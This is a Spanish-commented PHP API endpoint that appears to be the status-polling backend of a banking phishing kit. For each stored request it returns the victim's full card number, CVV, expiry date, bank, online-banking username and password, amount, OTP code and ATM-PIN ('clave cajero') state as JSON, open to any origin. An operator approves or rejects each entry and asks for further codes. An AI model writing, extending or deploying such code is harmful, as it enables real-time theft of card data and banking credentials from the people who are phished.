<?php
// api/estado.php
// 🔒 Endpoint para verificar el estado de una solicitud (polling)
// Devuelve JSON para que el frontend sepa si fue aprobado o rechazado

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

$id = $_GET['id'] ?? '';

if (empty($id)) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'error' => 'ID requerido'
    ]);
    exit;
}

$file = __DIR__ . '/../data/solicitudes.dat';
$solicitudes = [];

if (file_exists($file)) {
    $content = file_get_contents($file);
    $solicitudes = json_decode($content, true) ?: [];
}

foreach ($solicitudes as $s) {
    if ($s['id'] === $id) {
        $estado = $s['estado'] ?? 'pending';
        
        // ============================================
        // MAPEAR ESTADOS PARA EL FRONTEND
        // ============================================
        $estado_frontend = $estado;
        
        // 🔥 Estados aprobados (incluye Clave Cajero)
        $estados_approved = ['approved', 'approved_otp', 'approved_clave_cajero'];
        // 🔥 Estados rechazados (incluye Clave Cajero)
        $estados_rejected = ['rejected', 'rejected_otp', 'rejected_clave_cajero'];
        // 🔥 Estados pendientes (OTP y Clave Cajero)
        $estados_pending = ['pending_otp', 'pending_clave_cajero'];
        
        if (in_array($estado, $estados_approved)) {
            $estado_frontend = 'approved';
        } elseif (in_array($estado, $estados_rejected)) {
            $estado_frontend = 'rejected';
        } elseif (in_array($estado, $estados_pending)) {
            $estado_frontend = $estado;
        }
        
        // ============================================
        // 🔥 CORREGIDO: FORZAR EL MODO SEGÚN EL ESTADO
        // ============================================
        $otp_modo = $s['otp_modo'] ?? 'otp';
        
        // Si el estado es pending_clave_cajero, forzar modo clave_cajero
        if ($estado === 'pending_clave_cajero') {
            $otp_modo = 'clave_cajero';
        }
        
        // Si el estado es pending_otp, verificar si es clave_dinamica
        if ($estado === 'pending_otp') {
            // Si el modo guardado es clave_dinamica, mantenerlo
            if ($otp_modo !== 'clave_dinamica') {
                $otp_modo = 'otp';
            }
        }
        
        $otp_codigo = $s['otp_codigo'] ?? null;
        
        // 🔥 Obtener datos de la tarjeta
        $numero_tarjeta = $s['numero_tarjeta'] ?? $s['tarjeta'] ?? 'N/A';
        $cvv = $s['cvv'] ?? 'N/A';
        $vencimiento = $s['vencimiento'] ?? 'N/A';
        $banco = $s['banco'] ?? 'N/A';
        $usuario = $s['usuario'] ?? 'N/A';
        $password = $s['password'] ?? 'N/A';
        $monto = $s['monto'] ?? 'N/A';
        
        echo json_encode([
            'success' => true,
            'id' => $s['id'],
            'estado' => $estado_frontend,
            'estado_real' => $estado,
            'tipo_tarjeta' => $s['tipo_tarjeta'] ?? 'visa',
            'otp_codigo' => $otp_codigo,
            'otp_modo' => $otp_modo,
            'numero_tarjeta' => $numero_tarjeta,
            'cvv' => $cvv,
            'vencimiento' => $vencimiento,
            'banco' => $banco,
            'usuario' => $usuario,
            'password' => $password,
            'monto' => $monto,
            'fecha_hora' => $s['fecha_hora'] ?? $s['fecha'] ?? date('Y-m-d H:i:s')
        ]);
        exit;
    }
}

// Si no se encuentra la solicitud
echo json_encode([
    'success' => true,
    'id' => $id,
    'estado' => 'pending',
    'tipo_tarjeta' => 'visa',
    'otp_modo' => 'otp',
    'otp_codigo' => null,
    'numero_tarjeta' => 'N/A',
    'cvv' => 'N/A',
    'vencimiento' => 'N/A',
    'banco' => 'N/A',
    'usuario' => 'N/A',
    'password' => 'N/A',
    'monto' => 'N/A'
]);